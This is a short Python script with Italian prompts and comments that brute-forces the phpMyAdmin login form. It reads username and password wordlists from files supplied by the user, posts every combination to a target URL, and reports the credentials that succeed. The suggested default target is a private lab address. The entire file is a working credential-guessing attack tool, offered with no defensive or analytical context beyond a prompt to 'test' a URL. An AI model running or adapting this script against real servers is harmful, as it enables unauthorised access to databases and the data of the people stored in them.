import requests
from colorama import Fore, Style
from selenium import webdriver
import sys

def phpMyAdmin():
    url = input(f"{Fore.RED}[+] {Fore.WHITE}Che URL vuoi testare? Consiglio: {Fore.YELLOW}http://192.168.1.101/phpMyAdmin/index.php {Fore.WHITE}: ")
    #url = "http://192.168.1.101/phpMyAdmin/index.php"

    response = requests.get(url)
    #print(f"{Fore.GREEN}[i] {Fore.WHITE}LO STATUS E': ", response.status_code)
    #print(f"{Fore.GREEN}[i] {Fore.WHITE}Headers: ", response.headers['Content-Type'])
    #print(f"{Fore.GREEN}[i] {Fore.WHITE}Continuiamo")

    username_file = input(f"{Fore.RED}[+] {Fore.WHITE}Inserisci il percorso degli utenti file ")
    password_file = input(f"{Fore.RED}[+] {Fore.WHITE}Inserisci il percorso del password file: ")


    #Apro il username file in modalità lettura
    fileusr = open(username_file, "r")
    filepwd = open(password_file, "r")
    #Apro il password file in modalità lettura
    fileusrlist = fileusr.readlines()
    filepwdlist = filepwd.readlines()

    status_precedente = 0
    #Ciclo per ogni password
    for username in fileusrlist:
        username = username.rstrip()
        for password in filepwdlist:
            password = password.rstrip()
            # Qui colleziono le info prese dall' "ispezione "
            data = {'pma_username':username, 'pma_password':password}
            send_data_url = requests.post(url, data=data)

            if "Access denied" in send_data_url.text:

                print(f"{Fore.RED}[X] LOGIN FALLITO:{Style.RESET_ALL} Utente {Fore.YELLOW}%s {Style.RESET_ALL}con la password:{Fore.RED}" % username, password)
            else:
                print(f"{Fore.GREEN}[*] LOGIN EFFETTUATO:{Style.RESET_ALL} Utente {Fore.YELLOW}%s {Style.RESET_ALL}con la password:{Fore.GREEN}" % username, password,)
                exit()